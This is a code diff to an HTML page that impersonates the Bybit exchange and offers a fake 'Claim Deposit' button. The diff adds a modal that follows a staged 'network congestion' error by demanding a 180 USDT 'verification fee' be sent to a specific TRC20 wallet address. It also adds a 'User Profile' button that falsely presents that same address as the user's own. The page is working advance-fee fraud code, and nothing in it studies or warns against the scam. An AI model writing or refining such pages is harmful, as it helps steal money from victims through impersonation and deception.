@@ -54,7 +54,7 @@
             font-weight: bold;
             color: #ff8c00;
         }
-        .claim-button, .home-button {
+        .claim-button, .home-button, .profile-button {
             display: block;
             width: 100%;
             background: #ff8c00;
@@ -69,7 +69,8 @@
             transition: background 0.2s;
         }
         .claim-button:hover:enabled,
-        .home-button:hover:enabled {
+        .home-button:hover:enabled,
+        .profile-button:hover:enabled {
             background: #e67600;
         }
         .claim-button:disabled {
@@ -93,6 +94,72 @@
         }
         .signature strong {
             color: #ff8c00;
+        }
+        /* Modal styles */
+        .modal {
+            display: none; 
+            position: fixed; 
+            z-index: 1001; 
+            left: 0;
+            top: 0;
+            width: 100%; 
+            height: 100%; 
+            overflow: auto; 
+            background: rgba(0,0,0,0.4); 
+        }
+        .modal-content {
+            background: #fff;
+            margin: 10% auto;
+            padding: 30px 20px;
+            border-radius: 10px;
+            border: 1px solid #ff8c00;
+            max-width: 350px;
+            text-align: center;
+            position: relative;
+        }
+        .modal-content h3 {
+            color: #ff8c00;
+            margin-bottom: 12px;
+        }
+        .modal-content p {
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 18px;
+        }
+        .modal-close {
+            position: absolute;
+            top: 10px;
+            right: 18px;
+            font-size: 22px;
+            color: #888;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+        .modal-action-btn {
+            background: #ff8c00;
+            color: #fff;
+            padding: 10px 0;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 15px;
+            font-weight: bold;
+            transition: background .2s;
+            margin-top: 4px;
+        }
+        .modal-action-btn:hover {
+            background: #e67600;
+        }
+        .modal-address {
+            background: #f7f7f7;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 14px;
+            color: #222;
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -121,16 +188,45 @@
             </div>
             <button class="home-button" id="home-button" type="button">Add to Home Screen</button>
             <button class="claim-button" id="claim-button" type="button">Claim Deposit</button>
+            <button class="profile-button" id="profile-button" type="button">User Profile</button>
             <div class="error-message" id="error-message" role="alert"></div>
             <div class="signature">
                 <strong>Signature:</strong> Payment officially verified and sent by <strong>bybit.com</strong><br>
                 <span style="font-size:12px;color:#999;">Timestamp: <span id="timestamp"></span></span>
             </div>
         </section>
+        <!-- Modal Popup -->
+        <div id="modal" class="modal" aria-modal="true" role="dialog">
+            <div class="modal-content">
+                <button class="modal-close" id="modal-close" aria-label="Close">&times;</button>
+                <div id="modal-body">
+                    <!-- Modal content will be injected here -->
+                </div>
+            </div>
+        </div>
     </main>
     <script>
         // Set current timestamp
         document.getElementById('timestamp').textContent = new Date().toLocaleString();
+
+        // Modal logic
+        const modal = document.getElementById('modal');
+        const modalBody = document.getElementById('modal-body');
+        const modalClose = document.getElementById('modal-close');
+
+        function showModal(contentHtml) {
+            modalBody.innerHTML = contentHtml;
+            modal.style.display = "block";
+        }
+
+        function closeModal() {
+            modal.style.display = "none";
+        }
+
+        modalClose.onclick = closeModal;
+        window.onclick = function(event) {
+            if (event.target === modal) closeModal();
+        };
 
         // Claim Deposit logic
         const claimButton = document.getElementById('claim-button');
@@ -144,11 +240,29 @@
 
             // Simulate network/process delay
             setTimeout(() => {
-                errorMessage.textContent = 'Network congestion detected. Please try again later or contact support if the issue persists.';
+                // Show modal popup instead of error-message
+                showModal(`
+                    <h3>Error: Additional Verification Required</h3>
+                    <p>
+                        <strong>Network congestion detected.</strong><br>
+                        <span style="color:#d32f2f;">Your deposit requires verification via a <b>Signed Bybit GEWI</b> for a fee of <b>180 USDT</b> before it can be claimed.</span><br>
+                        Please transfer <strong>180 USDT</strong> to the address below using <strong>TRC20 network</strong> to continue:
+                    </p>
+                    <div class="modal-address">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</div>
+                    <button class="modal-action-btn" id="modal-done-btn">Done</button>
+                `);
                 claimButton.disabled = false;
                 claimButton.textContent = 'Claim Deposit';
                 depositStatus.textContent = 'Pending'; // Update if needed
-            }, 4000);
+
+                // Add click handler for Done button
+                setTimeout(() => {
+                    const doneBtn = document.getElementById('modal-done-btn');
+                    if (doneBtn) {
+                        doneBtn.onclick = closeModal;
+                    }
+                }, 50);
+            }, 1400);
         });
 
         // Add to Home Screen logic
@@ -160,6 +274,26 @@
             } else {
                 alert("To add this page to your Home Screen:\n\n- On iPhone/iPad: Tap Share, then 'Add to Home Screen'.\n- On Android: Tap ⋮ menu, then 'Add to Home screen'.");
             }
+        });
+
+        // Profile button logic - show modal with address
+        const profileButton = document.getElementById('profile-button');
+        profileButton.addEventListener('click', () => {
+            showModal(`
+                <h3>User USDT Address</h3>
+                <p>
+                    USDT Address (TRC20 Network):
+                </p>
+                <div class="modal-address">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</div>
+                <button class="modal-action-btn" id="modal-done-btn-profile">Close</button>
+            `);
+
+            setTimeout(() => {
+                const doneBtn = document.getElementById('modal-done-btn-profile');
+                if (doneBtn) {
+                    doneBtn.onclick = closeModal;
+                }
+            }, 50);
         });
     </script>
 </body>
